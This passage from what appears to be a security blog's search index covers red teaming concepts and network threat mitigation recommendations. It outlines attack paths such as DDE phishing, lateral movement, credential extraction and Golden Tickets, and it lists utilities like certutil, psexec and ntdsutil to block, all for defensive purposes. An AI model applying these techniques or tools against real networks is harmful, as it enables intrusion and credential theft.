Succeed?"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#isnt-the-identification-and-mitigation-of-vulnerabilities-enough","text":"In order to answer, you must understand how a threat-actor thinks and acts. Remember, a threat is really an intelligent person bent on causing harm. It is NOT an exploit of a vulnerability, NOT a piece of malware, or NOT a phishing attack. These are merely means a threat-actor may choose to use to achieve their end goal. The threat-actor knows the target has a comprehensive security program. A suite of security tools (firewalls, intrusion detection systems, anti-virus, EDR, etc) are deployed with the intent of stopping cyber-attacks. A good threat-actor knows this and will most likely assume patches are deployed and vulnerability assessments and penetration tests are performed. This understanding can significantly change the actions taken by a threat-actor compared to the actions taken by a traditional security tester. Does the threat-actor fire up a port scanner and enumerate an entire network? Does a threat-actor fire up vulnerability scanning tool to find an exploit? Attacks by threat-actors do not always follow the models adopted by traditional security testing. An attack is not scan -> exploit -> profit. An intelligent threat-actor evaluates what a target presents and uses weakness not always discovered through traditional security tests. The threat-actor will take a number of controlled steps to gain access to a target, establish command and control, establish persistence, and ultimately achieve their desired goal. The people charged with defending an organization often ignore or misunderstand the steps taken by a threat-actor. This often leads to focus on prevention, not detection. Defenders who do focus on detection may drown themselves in un-actionable default or vendor generate logs and alerts. Have you ever heard from the defending team \"We have too many logs and alerts to respond!\"? Why do organizations log what they log? Compliance? In case they are needed? Vendor advice? Organizations are still missing a key piece to all threats; understanding their actions and TTPs.","title":"Isn't the identification and mitigation of vulnerabilities enough?"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#consider-this-scenario","text":"After evaluating a target network, a threat-actor decides phishing is their chosen method to gain access. A phish is sent to a small number of people. The phish contains an excel attachment with a DDE 4 based attack. An email recipient opens the attachment, malicious code is executed on the target, and command and control (C2) is established. The threat-actor then performs a series of steps that includes situational awareness of current access, enumeration of potential new targets, and lateral movement options to those targets. In this case, the threat finds clear text database credentials on a old test web application backup in a public share. The credentials are used to laterally move to a test database server. Code execution on the database server provides elevated access. The situational awareness cycle repeats. The threat-actor discovers elevated credentials stored in memory on the database server. Credential material is extracted from a Windows domain controller using the stolen elevated database credentials. The threat-actor performs additional situational awareness and enumeration using the new credentials from the domain controller. The intended target is identified and is located on a sensitive file repository. Using the elevated access and C2 channels, the threat-actor achieves their final objective and exfiltrates sensitive data outside the network. Is this scenario reasonable? Were opportunities presented to detect or prevent the threat? Organizations often blame the end user who clicked the link. What about the actions taken after the initial click? This scenario indicates an organization's entire security model may depend on users not clicking a link in an email. The organization does not intend to hinge all security on a single user, but the actions taken to defend their systems often say otherwise.","title":"Consider this scenario"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#why-is-this-scenario-successful","text":"Organizations often have the wrong mindset to security defense Users are blamed for clicking links Policies, procedures, and compliance measure security Log everything (You never know what you need) Patch, patch, patch. Threats only use exploits Our security tools will save use These can be valuable actions that reduce the attack surface, but an intelligent threat-actor knows this. Instead of only focusing on actions that impact the attack surface, organizations need to include a focus on threat TTPs. This does not mean focusing on a specific threat-actor. Whether the threat-actor is script kiddie or an APT, both will execute a series of steps (TTPs) to impact an organization. This is the key. Focusing on defending against TTPs combined with good security practices that reduce the attack surface is the most effective way to directly impact a threat-actor's ability to operate.","title":"Why is this scenario successful?"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#a-threat-will","text":"To keep it simple, a threat-actor must Get-In to establish an initial foothold. This phase is generally quick, but defenders place heavy focus here. They must Stay-In by establishing command and control (C2). This is the phase where the threat maintains influence over the target. Actions may include persistence, target identification, lateral movement, and privilege escalation. The Stay-In phase provides the most opportunity to detect or impact a threat, but is often ignored or misunderstood. Finally, the threat-actor will Act or perform the actions that reflect why they attacked if the first place. Keeping security simple can help defenders be focused an apply an intelligent defense strategy instead of defending everything at once. A threat-based approach to security testing may use several names; Red Teaming, Threat Operations, Threat Assessment, Purple Teaming, Adversarial Assessment, Penetration Testing, Vulnerability Testing. These are not all the same, and it is important that the security industry defines terms to establish a common understanding. To help with this, all threat-based security testing in this post will be referred to as Red Teaming. Definition of Red Teaming Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of people, processes, and technology used to defend an environment. In other words, red teaming is the process of emulating a threat using real threat techniques with the goal of training blue teams and/or measuring security operations as a whole. Red teaming can provide a deep understand of the negative impacts an intelligent threat-actor can have against a target. Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT . Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level? Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessment are good at reducing the attack surface but do not provide much detail in terms of organizational risk. Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target's attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits. Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat's ability to operate. Technical flaws are secondary to understanding how the threat was able to impact an organization's operations or how security operations was able to impact a threat's ability to operate.","title":"A Threat Will\u2026"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#pdrr-protect-detect-respond-recover-coverage","text":"The NIST CyberSecurity Framework 6 has guidance for improving critical infrastructure cybersecurity. According to NIST: The Framework provides a common taxonomy and mechanism for organizations to: Describe their current cybersecurity posture; Describe their target state for cybersecurity; Identify and prioritize opportunities for improvement within the context of a continuous and repeatable process; Assess progress toward the target state; Communicate among internal and external stakeholders about cybersecurity risk. The core of the framework presents industry standards, guidelines, and practices in a manner that allows for communication of cybersecurity activities and outcomes across an organization from the executive level to the operations level. The core consists of five functions\u2014Identify, Protect, Detect, Respond, Recover. The functions provide a high-level, strategic view of an organization's management of cybersecurity risk. The framework then identifies underlying key categories and subcategories for each function, and matches them with example informative references, such as existing standards, guidelines, and practices for each subcategory. For more details, visit https://www.nist.gov/cyberframework/cybersecurity-framework-faqs-framework-components . What does this mean for Red Teaming? Let's focus on how red teaming can be used by an organization to measure its ability to Protect , Detect , Respond , and Recover against a threat. Protect \u2013 The Protect function supports the ability to limit or contain the impact of a potential cybersecurity event. Detect \u2013 The Detect function enables the timely discovery of cybersecurity events. Respond \u2013 The Respond function supports the ability to contain the impact of a potential cybersecurity incident. Recover \u2013 The Recover function supports timely recovery to normal operations to reduce the impact from a cybersecurity incident. Red teaming allows an organization to explore a wide range of threat activity. This provides the stimulation required to engage security operations as a whole. Red teaming engages an organization's security operations (Blue Team) and exercises Blue TTPs through protection, detection, response, and recovery from a threat. Vulnerability assessments and penetration testing are generally more limited and typically only engage protection and some detection. The following illustrates the PDRR coverage of different assessment types.","title":"PDRR (Protect, Detect, Respond, Recover) Coverage"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#references","text":"Threat Definition, Dictionary.com, http://www.dictionary.com/browse/threat Threat Definition, ISO 27001, http://www.praxiom.com/iso-27001-definitions.htm#Threat Threat Definition, NIST, https://csrc.nist.gov/Glossary/?term=2156 Reviving DDE: Using OneNote and Excel for Code Execution, https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee NIST Cybersecurity Framework, https://www.nist.gov/cyberframework/csf-reference-tool MITRE ATT&CK Framework, https://attack.mitre.org/wiki/Main_Page","title":"References"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/","text":"Threat Mitigation Strategies: Observations and Recommendations \u00b6 James Tubberville | January 25, 2018 | Tweet This Post: Full disclosure: This post is heavy on text. Much of the content is very broad and uses simplified examples. There are literally thousands of extremely cool and interesting ways to limit threat activity; however, I've decided to simplify and focus on those that could have the most significant impact with relatively easy implementation. Enjoy! Topic \u00b6 While much of the world talks of protecting against an Advanced Persistent Threat (APT), in reality nearly all organizations and networks have an extremely hard time protecting against basic (or dare I say novice?) threats. I've been wanting to write a full white paper on the topic, but can't seem to find the time. Rather, I've decided to summarize my experience into a short series. The first in this series provides an introduction divided into three categories: general problem sets, observations, and recommendations. Follow-on post in the series will provide the technical detail (or \"how to\") for each of the recommendations. Background \u00b6 Over the years my team has performed numerous evaluations against a variety of networks. These evaluations attempted to extend beyond the simple enumeration of potential vulnerabilities (i.e. patches, updates and compliance measures) by reviewing the actions of real-world cyber based threats and attacks. Each assisted in determining the true risk associated with actions performed by a knowledgeable and determined threat. Each evaluation focused on these realistic risk profiles rather than focusing on ephemeral vulnerabilities. Threat Synopsis \u00b6 For those unfamiliar with threat operations, I think it is important to annotate the simplified set of threat actions commonly performed in a network prior to identification of problem sets, observations and recommendations. So, what does an example attack path look like? A threat typically gains access to an externally facing system or service (commonly in a DMZ) that is, in most instances, managed by the internal domain (not a true DMZ). The second method of access involves targeting internal client workstations by phishing, web drive-by, or some other form of social engineering. Once a threat has gained initial access, they leverage various lateral movement techniques to traverse the network away from the initial foothold. At this stage, a threat commonly establishes a method for command and control (C2) and persistence. C2 is simply the influence a threat has over a system to which access has been achieved. Persistence is simply a method for re-establishing or regaining access to C2. The established C2 and continued lateral movement enables the discovery of additional systems, interesting files, and potential paths to a target. The target is the information, system, person or process for which the threat is attempting to access. The threat re-evaluates each pivot through the network looking for these items and for methods of privilege escalation. In real-world scenarios, this stage is when the threat finds elevated account credentials stored in a file or pulls tokens and credentials from memory; however, there are also numerous methods for leveraging applications and services to gain elevated access. Threats repeat this process until privileges have been escalated to that of a Domain Administrator (DA) or higher. Once escalation is achieved, the threat most often targets a server, commonly the Domain Controller (DC). The DC communicates with and controls virtually everything within a windows based network. At this stage, the threat often has access to the target and can perform information collection and impacts as desired. In short, it's usually game over for the target. Although this simplification identifies a Windows based network. It is also important to understand that access to a server, DC, or directory services may not be a requirement for access or impact to the target; however, it is more often than not a major enabler. This synopsis simply demonstrates that most threat attack paths follow the same principles of getting in , staying in and acting regardless of the tools, techniques, and procedures (TTPs), or motivators. Problem Sets \u00b6 As IT and security professionals, we must understand that \"security\" isn't what we should strive towards. Our purpose is to enable the objectives, functions, sustainment and success of the businesses and systems we support. Rather than forcing the concepts of \"security\", we should be identifying and communicating how our efforts support those basic business requirements and provide solutions to existing (and potential) problems to business success. In this article, I'm focusing on those security problems in which most IT and security staff directly influence. Although every organization has it's own unique set of problems, there is a clear commonality that all lead to four root causes. Consider This Anyone has the ability to influence any aspect of the organization regardless of their position! Compliance does not equate to security \u00b6 Given the general construct of how a threat's actions might leverage a network's architecture, simply meeting compliance requirements does little to enable the prevention or detection of threat actions. Across the board, compliance has been set as the bar of achievement when, in reality, compliance is the absolute minimum set of controls, policies and procedures that should be enforced. Don't misunderstand the concept. Compliance is absolutely a requirement and does much for the general security posture of a system or network. However, I've tested hundreds of systems and networks that (at least on paper) were fully compliant with their required standard, but failed to adequately protect the business and associated functions/information. Partial implementation of security controls enable a threat \u00b6 Of the compliance measures employed, many are only partially implemented. One example observed in every effort to date are remote management capabilities. Most Windows Firewall requirements state unsolicited inbound connections must be blocked; however, in each evaluation all hosts tested were able to send and receive connections to/from other devices on the network. Although a firewall was installed and active, it allowed connections via multiple ports, protocols and services (PPS). While this is a single example, it emphasizes the methods in which compliance measures are only partially implemented. Tools are only Enablers \u00b6 Another commonality across the board is an over reliance on tools to perform prevention and detection activities. Our industry dedicates large amounts of valuable resources to the development or purchase of systems and software (tools) that provide little value in the overall security of a network. Many of these tools have been in use or development for multiple years and have undergone numerous reviews; however, few have been successful in thwarting real-world threats. In fact, many of the tools deployed to date have been easily bypassed, detected or leveraged by knowledgeable threats. Tools are enablers. They provide a cognizant human with the information required to make an intelligent decision. Policies and Procedural Nightmares \u00b6 Cumbersome policies and procedures elongate the process for implementing timely and effective defensive mitigations. All interviewed system, network and defensive staff identified longstanding issues with receiving approval to implement change and the timeliness of any approvals received. This concern has been relayed throughout the industry for years. If policy and procedures are primary inhibitors to the successful defense of our networks, policy and procedures must be modified to accommodate the need. If detailed, the number of existing problem sets, vulnerabilities, and operational requirements far exceed any realistic ability to read, digest and act in a timely manner. The four problem sets listed above are of high importance as they are the foundation to all other sets. Each organization must begin addressing methods for limiting a threat's actions without increasing complexity, impacting the way in which systems and networks operate by design (user work-flow), or chasing ephemeral vulnerabilities. I'm left asking myself, why would we (the IT and security community) continue down the same ineffective paths, but continuously expect different results? While meeting compliance requirements does have an extremely valuable effect on security, the next section provides recommendations that would benefit any organization far more. Each of the observations and recommendations are the result of many, many efforts. The recommendations can be applied to any and all networks. Some networks will have exceptions; however, these are exceptions (not the status quo) and should be handled as such. Client-to-client communication \u00b6 Clients rarely need to communicate amongst themselves. Over a roughly eighteen-year period and hundreds of various networks, less than a handful of architectures have had requirements for client-to-client communication (most due to application design failures/features). Observations \u00b6 Of the systems and networks evaluated in recent years, none have required client-to-client communications. In fact, most have already implemented some type of host-based firewall. Yet in every network evaluated to date, all have been configured to allow client-to-client communication. Often the systems, network and defensive teams were unaware that such communications were allowed. In other instances administrative functions were identified as reasons for allowing communication. Example: During review, each network staff identifies that host-based firewalls have been implemented; however, initiating a connection to other clients using multiple ports and protocols has always been successful. Most often the staff cite requirements for system and network administration using Server Message Block (SMB), Remote Desktop Protocol (RDP) or another Remote Administration Tool (RAT). In several instances, security tools were also identified as reasoning for allowing client-to-client communications. Note There are multiple methods of allowing communications for administrative purposes only when required and should never be allowed perpetually. Recommendation: Prevent client-to-client communication \u00b6 Simply implement and configure host and network based firewalls, IPTables, Access Control Lists (ACLs), etc. Leverage any and all capabilities of the network and organization. Preventing these communications limits a threat's ability to move freely throughout the network, reduces the likelihood of privileged account discovery, forces an increase in time and effort (more activities and artifacts), and therefore can increase the defender's ability to detect. Note Effective configuration of host based firewalls requires a thorough understanding of what network traffic should occur (what does normal look like?). Server-to-client communication \u00b6 Most client-server designs require a client to request information from a server. Experience has provided few instances where a server should initiate communications to a client. Observations \u00b6 Of the networks evaluated, none have required server-to-client communications. Yet in every network evaluated to date, all have been configured to allow server-to-client communication. A common threat action is to leverage a server's ability to communicate with clients or segments to move through a network. This often allows the threat to access targets or bridge network segments even when segmentation has been properly implemented. Recommendation: Prevent server-to-client communication \u00b6 Assuming the network has prevented client-to-client communications, the only option a threat has is to attempt access to a server. Given this scenario, it is more than feasible to limit a server's ability to initiate communications with a client. This recommendation limits the threat's ability to move from workstation, to a server and back to another workstation. When connections to clients are attempted, those should stand out as indicators of malicious activity. The most common IT staff concern with this implementation is malfunctioning or broken clients. This is a perfect example of where security implementations assist with the overall health of the network. If a client cannot initiate communications with the server, the client has other issues. This should be cause for investigation and correction rather than simply forcing connections from the server. Another common concern is the ability to \"push\" software, updates, etc. from the server. This is another instance where best practices are not being followed. A client should always request from a server. If deploying software or updates, the client should be notified when communicating with the server (via policy, configurations, etc.) and pull the respective requirements. Note In this context, a server is a functional role rather than a type of device. Outbound Server Communications \u00b6 With very few exceptions, servers should never call outside the network. Observations \u00b6 Of the networks evaluated, all have had servers that allow communication with external (non-organizational) systems. This communication allows a threat to exfiltrate data directly from a server in which it has gained access. It also allows data restricted to certain network segments to be moved through a server and out of the network, often without detection. Recommendation: Block outbound server communications \u00b6 There are few instances where a server needs to communicate with a system external to the network. These are exceptions and should be managed to allow only connections to the required external asset or IP and allow only the use of required ports and protocols. All other outbound communications from servers should be blocked. This implementation combined with the limits between clients and server-to-client exponentially increases the difficulty of lateral movement and command and control. Should your internal Domain Controller manage the server in the DMZ? Of course not, but how many organization effectively control communication paths? Cached administrative credentials \u00b6 Cached credential discovery is a common and primary method in which threats escalate privileges. Cached credentials are simply credentials temporarily stored for use by the system in which they reside. When administrative access for the current activity or session ends, the cached credential is no longer required. Observations \u00b6 Of the networks evaluated, all have had cached administrative credentials present. These credentials are stored in memory when system and network administrators perform maintenance functions, when helpdesk personnel perform user support and when a tool is used to perform an automated task. This is a common problem on virtually all networks and the reason why a threat will leverage this functionality. Recommendation: Clear cached administrative credentials \u00b6 Clearing credentials is relatively easy to do, yet is not often done. A few simple registry changes and requiring administrators to reboot (mainly workstations/clients) after using elevated accounts is a great step forward in limiting cached credentials. Also, forcing the use of Remote Desktop Credential Guard and Restricted Admin (see client-to-client above) has proven to be helpful in limitations; however, depending upon function, there may still be cached credentials present. It is recommended to always reboot after administrative functions. Note There are also several methods for injecting invalid credentials into memory for use as indicators. These HoneyTokens can be used as indicators of malicious activity. KRBTGT (Domain Kerberos Account) \u00b6 By now most have heard of Golden Tickets (GT) and Silver Tickets (ST) created via the domain KRBTGT (Domain Kerberos) account's NTLM hash. These tickets can be valid for extremely long periods of time and allow access to domain resources even after administrative credentials have been changed. Observations \u00b6 Although many security professionals understand the GT/ST concept, most standard IT staff either don't know or are unclear on how they work. Many of the organizations evaluated have never reset the KRBTGT account. Of the few that have, many only reset once. This first reset does change the credential; however, the initial reset also creates a \"backup\". Due to this functionality, the KRBTGT account must be reset twice to flush old credentials completely. Only after the second reset are existing Golden and Silver Tickets rendered useless. Recommendation: Reset the KRBTGT Account \u00b6 Reset the KRBTGT account twice within a limited time-frame (36-48 hours apart is recommended) followed by the changing of all administrative credentials. These resets limit a threat's ability to maintain access after credential changes. The administrative credential change is highly recommended and should be required. If the threat has a valid GT they have obtained valid credentials. A new Golden Ticket can be created after the KRBTGT reset if credentials have not been changed (defeating the purpose of the KRBTGT reset). This process should be completed periodically (no less frequently than quarterly). Note Anyone using assets not on the network during the resets (traveling, out of office, etc.) will likely need help authenticating when reconnecting. Sensitive Items \u00b6 Sensitive items include credentials, configuration files, Privacy of Information Act (PIA) data, Intellectual Property, anything close-hold or critical to business operations, etc. Observations \u00b6 In every network evaluated, multiple instances of sensitive items were discovered. Items were found in many different locations to include organizational file shares, personal file shares, workstation directories, server directories, organizational websites and often on external (non-organizational) websites. More often than not, they are available to anyone with access to the network. These items provide the threat either the information for the target or the information required to obtain access to the target. Recommendation: Perform a sensitive items review \u00b6 Perform frequent search and discovery activities for critical items stored across the network and network systems. With the exception of credential storage, there are legitimate reasons for storing information such as configurations, diagrams, business information, etc. on the network. These need special focus to determine where they are stored, who has access and if they have any authenticators or credentials. Challenge: Perform a string search for \"pass\", \"assw\", \"pwd\", \"key\", and \"Type 7\" on the network. You may be amazed at what is discovered. Ports, Protocols, and Services \u00b6 Ports, protocols and services (PPS) are simply the technical means by which networks communicate. Observations \u00b6 In every network evaluated, PPS were not limited to only those required. This applies to internal as much as external communications. Many organizations rely on firewalls to limit specific ports and protocols from external sources; however, they have limited controls on what PPS traverse the internal network. Even when internal firewalls are in place, traffic is often not restricted appropriately. Recommendation: Block and Disable non-required ports, protocols, and services (PPS) \u00b6 Both internal and external systems and network devices should block PPS that aren't required for the network. Limit PPS to only what is required for each specific system. Think of this as \"PPS white-listing\". Does the network have a need for port 5900 to traverse the entire network? Or is there a need for port 5900 to a specific system? Does the network really need IPX/SPX, WPAD, LLMNR, and NetBIOS enabled? Controlling PPS limits a threat's range of capabilities and increases chances of detection. Note Firewalls (network or host based) are listed above as an easy example. Network based firewalls are simply traffic control devices that allow ingress and egress traffic based upon configuration. Host based firewalls do the same for individual hosts. Accounts and privileges \u00b6 Accounts, group memberships, and privileges are primary enablers for most threat actions. Effective management and control greatly limits a threat's ability to execute within a network. Observations \u00b6 Many organizations have user accounts with some level of elevated access, administrative accounts that administer multiple resource types, and groups with specific permissions nested within other groups with higher level permissions. Each of these enable a threat to freely escalate privileges to a level required to meet their objective. Consider this Concept A threat has the ability to elevate a standard user to one of privileged access, elevate a privileged access account to local administrator, and/or elevate local administrator to domain administrator. If a threat has the ability to escalate a standard user account to that of DA, so does every other user on the network. Recommendation 1: Implement separation of accounts and privileges \u00b6 Ensure separation of user, privileged access, and administrator accounts. Also ensure administrative accounts can only administer within its area of responsibility. System administrators should only administer systems and not have access to servers. Server administrators should only be able to administer servers and not have access to workstations. Domain administrators should not have access to administer servers or workstations. Users should be limited to only what is required to perform daily tasks. Standard users often do not require elevated privileges on a daily basis. In rare scenarios where a user needs elevation often, require the use of a secondary account with only the access required and no external communications ability. Likewise, administrators shouldn't be using elevated accounts for daily tasks. As a general rule all elevated accounts should be restricted from external communications (including internet and email). Also, consider having separate dedicated administrative systems with no email client, Internet browser, timecard access, document editing, any external communication, etc. Recommendation 2: Ensure group permissions are appropriately identified and mapped. \u00b6 This recommendation has multiple applications; however, the main focus is nested groups and permissions. Nesting is a common problem in nearly every windows based-network in existence. Is it easier to troubleshoot permissions or give a user membership to a group to solve the problem? We've all been there. Consider this Concept Group 3 has domain access. Group 2 has server access. Group 1 has workstation access. Group 0 are domain users in a specific division. If a member of Group 0 is assigned to Group 1 due to an elevation requirement, the chances of that user being able to escalate to domain administrator (Group 3) are high. This occurs simply because at least one member of Group 1 is likely a member of Group 2, and at least one member of Group 2 is likely a member of Group 3. It may require a bit of work, but these are the paths and nested permissions a threat will leverage to gain elevated access. Recommendation 3: Implement Microsoft Local Administrator Password Solution (LAPS) \u00b6 LAPS provides automated local administrator account management for every computer in Active Directory. A client-side component generates a random password, updates the LAPS password on the Active Directory computer account, and sets the password locally. LAPS configuration is managed through Group Policy which provides the values for password complexity, password length, local account name for password change, password change frequency, etc. Recommendation 4: Rudimentary *nix Two Factor Authentication (2FA) \u00b6 Many organizations have issues with credential reuse and implementation of Two Factor Authentication (2FA) in *nix based systems especially in off-line or closed networks. A very rudimentary but simple implementation of 2FA is the use of ssh key-files. The user generates a key-file that requires a password for use. The system administrator configures the system to require a key and password. The user now must use the password protected key-file to connect and the system password to complete authentication. Account and Event Activity \u00b6 Account and event activity should be major factors in identifying potential issues or threats within a network. Unfortunately, these are often logged but rarely monitored effectively. Observations \u00b6 Account and event activity collection is commonly identified as a compliance item and treated as a box to be checked. Multiple organizations have successfully configured logging and event forwarding and have alerts to match each event. Yet a common issue discovered in every organization to date is the unreasonable number of notifications or alerts received. Defensive staff are unable to follow every thread to a root cause due to time constraints and the vast number of alerts received. If a dedicated defensive team is unable to run every alert to ground, the alerts, logging, and collection has not been appropriately configured and tuned. Recommendation 1: Monitor login failures and successes \u00b6 Short and simple. Multiple fails followed by a success indicates bad things. Many organizations focus on the failures and only respond when a target number of failures occur (i.e. three failed attempts per account or 300 failed attempts total). Consider this Concept A threat has a password discovered via open source intelligence. The account is unknown; however, the password file has a recent date. The threat performs one validation per account for all accounts on the network (or Outlook Web Access or external SharePoint Portal). After twenty attempts one account has the same password and successfully authenticates. This action met neither of the conditions for alerting. Would this action be identified? Recommendation 2: Consider implementing a second instance or dashboard (or properly tuning the primary) \u00b6 Given that most organizations have a compliance requirement to log all events, it is unreasonable to discard all incoming data. It is feasible to tune the primary or a second instance, dashboard, etc. to look specifically for the indicators as described above. Example: The network has been configured to prevent client-to-client communications. If client-to-client communications are attempted, an alert provides notification. !!! Note: The example action should occur for the eight or ten actions common to most threats. Eight or ten possible scenarios are much easier to monitor and maintain and provide a realistic view of potential threats (outsider or insider) within the network. Application Whitelisting \u00b6 Application Whitelisting is the process of identifying approved software, allowing only those applications to run on a system, and blocking all others. Observations \u00b6 Application Whitelisting is extremely useful in securing a network; however, for any organization with a larger footprint, dispersed locations and a diverse set of business requirements; it can be cumbersome to configure and maintain. In addition, many Application Whitelisting tools and techniques have been bypassed or leveraged to execute malicious code and security researchers continue to discover new ways of doing so. Application Whitelisting provides some value to the overall security of a network, but isn't the silver bullet everyone expects. Combined with other recommendations Application Whitelisting provides an exponential increase in time and difficulty to a threat. Recommendation: Application Whitelisting \u00b6 Implement Application Whitelisting only after all of the prior recommendations have been implemented. An interim strategy (until Application Whitelisting can be fully implemented) may be to prevent standard user execution of specific applications such as: arp, at, certutil, cscript, cmd, dsquery, hostname, ipconfig, msbuild, nbtstat, net, netsh, netstat, nslookup, ntdsutil, pcalua, ping, powershell, psexec, reg, regasm, regedit, regedt32, regsvr32, regsvcs, rundll32, set, sc, schtasks, systeminfo, tasklist, tracert, whoami, wmic, wscript, wsmprovhost, etc. Do standard users normally run any of the preceding commands? Should they? Most users do not use these commands. If they do, why? Most organizations have historically focused on prevention (which is why we consistently see networks with a harder exterior and soft chewy center). While prevention is a huge concern, complete protection will never be possible. Although preventative in nature, the major benefit of the listed recommendations is relative ease of detection. Each activity performed outside the baseline should stand out as indicators of malicious activity. My closing recommendation is for all organizations and security professionals to adopt the concept of \"Assumed Breach\" . An Assumed Breach mentality accepts that a network is currently, or will eventually be, compromised. Prepare your networks and business functions as if there's a known or impending threat to the network. I'll expand more on this in future posts. If a standard user was given administrative credentials while sitting at their workstation, what could they do? What did you come up with? Should a user be able to perform those actions?","title":"Threat Mitagation Strategies - Part 1"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#threat-mitigation-strategies-observations-and-recommendations","text":"James Tubberville | January 25, 2018 | Tweet This Post: Full disclosure: This post is heavy on text. Much of the content is very broad and uses simplified examples. There are literally thousands of extremely cool and interesting ways to limit threat activity; however, I've decided to simplify and focus on those that could have the most significant impact with relatively easy implementation. Enjoy!","title":"Threat Mitigation Strategies: Observations and Recommendations"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#topic","text":"While much of the world talks of protecting against an Advanced Persistent Threat (APT), in reality nearly all organizations and networks have an extremely hard time protecting against basic (or dare I say novice?) threats. I've been wanting to write a full white paper on the topic, but can't seem to find the time. Rather, I've decided to summarize my experience into a short series. The first in this series provides an introduction divided into three categories: general problem sets, observations, and recommendations. Follow-on post in the series will provide the technical detail (or \"how to\") for each of the recommendations.","title":"Topic"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#background","text":"Over the years my team has performed numerous evaluations against a variety of networks. These evaluations attempted to extend beyond the simple enumeration of potential vulnerabilities (i.e. patches, updates and compliance measures) by reviewing the actions of real-world cyber based threats and attacks. Each assisted in determining the true risk associated with actions performed by a knowledgeable and determined threat. Each evaluation focused on these realistic risk profiles rather than focusing on ephemeral vulnerabilities.","title":"Background"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#threat-synopsis","text":"For those unfamiliar with threat operations, I think it is important to annotate the simplified set of threat actions commonly performed in a network prior to identification of problem sets, observations and recommendations. So, what does an example attack path look like? A threat typically gains access to an externally facing system or service (commonly in a DMZ) that is, in most instances, managed by the internal domain (not a true DMZ). The second method of access involves targeting internal client workstations by phishing, web drive-by, or some other form of social engineering. Once a threat has gained initial access, they leverage various lateral movement techniques to traverse the network away from the initial foothold. At this stage, a threat commonly establishes a method for command and control (C2) and persistence. C2 is simply the influence a threat has over a system to which access has been achieved. Persistence is simply a method for re-establishing or regaining access to C2. The established C2 and continued lateral movement enables the discovery of additional systems, interesting files, and potential paths to a target. The target is the information, system, person or process for which the threat is attempting to access. The threat re-evaluates each pivot through the network looking for these items and for methods of privilege escalation. In real-world scenarios, this stage is when the threat finds elevated account credentials stored in a file or pulls tokens and credentials from memory; however, there are also numerous methods for leveraging applications and services to gain elevated access. Threats repeat this process until privileges have been escalated to that of a Domain Administrator (DA) or higher. Once escalation is achieved, the threat most often targets a server, commonly the Domain Controller (DC). The DC communicates with and controls virtually everything within a windows based network. At this stage, the threat often has access to the target and can perform information collection and impacts as desired. In short, it's usually game over for the target. Although this simplification identifies a Windows based network. It is also important to understand that access to a server, DC, or directory services may not be a requirement for access or impact to the target; however, it is more often than not a major enabler. This synopsis simply demonstrates that most threat attack paths follow the same principles of getting in , staying in and acting regardless of the tools, techniques, and procedures (TTPs), or motivators.","title":"Threat Synopsis"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#problem-sets","text":"As IT and security professionals, we must understand that \"security\" isn't what we should strive towards. Our purpose is to enable the objectives, functions, sustainment and success of the businesses and systems we support. Rather than forcing the concepts of \"security\", we should be identifying and communicating how our efforts support those basic business requirements and provide solutions to existing (and potential) problems to business success. In this article, I'm focusing on those security problems in which most IT and security staff directly influence. Although every organization has it's own unique set of problems, there is a clear commonality that all lead to four root causes. Consider This Anyone has the ability to influence any aspect of the organization regardless of their position!","title":"Problem Sets"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#compliance-does-not-equate-to-security","text":"Given the general construct of how a threat's actions might leverage a network's architecture, simply meeting compliance requirements does little to enable the prevention or detection of threat actions. Across the board, compliance has been set as the bar of achievement when, in reality, compliance is the absolute minimum set of controls, policies and procedures that should be enforced. Don't misunderstand the concept. Compliance is absolutely a requirement and does much for the general security posture of a system or network. However, I've tested hundreds of systems and networks that (at least on paper) were fully compliant with their required standard, but failed to adequately protect the business and associated functions/information.","title":"Compliance does not equate to security"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#partial-implementation-of-security-controls-enable-a-threat","text":"Of the compliance measures employed, many are only partially implemented. One example observed in every effort to date are remote management capabilities. Most Windows Firewall requirements state unsolicited inbound connections must be blocked; however, in each evaluation all hosts tested were able to send and receive connections to/from other devices on the network. Although a firewall was installed and active, it allowed connections via multiple ports, protocols and services (PPS). While this is a single example, it emphasizes the methods in which compliance measures are only partially implemented.","title":"Partial implementation of security controls enable a threat"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#tools-are-only-enablers","text":"Another commonality across the board is an over reliance on tools to perform prevention and detection activities. Our industry dedicates large amounts of valuable resources to the development or purchase of systems and software (tools) that provide little value in the overall security of a network. Many of these tools have been in use or development for multiple years and have undergone numerous reviews; however, few have been successful in thwarting real-world threats. In fact, many of the tools deployed to date have been easily bypassed, detected or leveraged by knowledgeable threats. Tools are enablers. They provide a cognizant human with the 